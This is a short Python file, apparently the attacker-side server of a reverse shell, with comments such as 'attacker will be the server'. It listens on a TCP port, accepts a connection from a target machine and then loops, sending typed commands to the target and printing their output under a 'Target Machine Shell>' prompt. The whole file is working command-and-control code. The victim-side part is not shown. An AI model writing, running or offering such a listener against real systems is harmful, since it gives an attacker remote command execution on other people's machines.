import socket
from config import *
from socket_with_buffer import Socket


def main():
    # attacker will be the server in TCP
    # create server socket that listens for incoming connection requests
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_listening_socket:
        server_listening_socket.bind(('', PORT_NUMBER))
        server_listening_socket.listen()

        # once connection is made, activate the remote shell
        conn, address = server_listening_socket.accept()
        with conn:
            print('connection received from', address)

            client_socket = Socket(conn) # keep same socket alive for every command we send

            # simulate remote shell
            while True:
                user_input = input('Target Machine Shell> ') # ask user to input a command
                client_socket.send(user_input) # send our command
                command_output = client_socket.receive() # get output from our command
                print(command_output)
                print()

if __name__ == '__main__':
    main()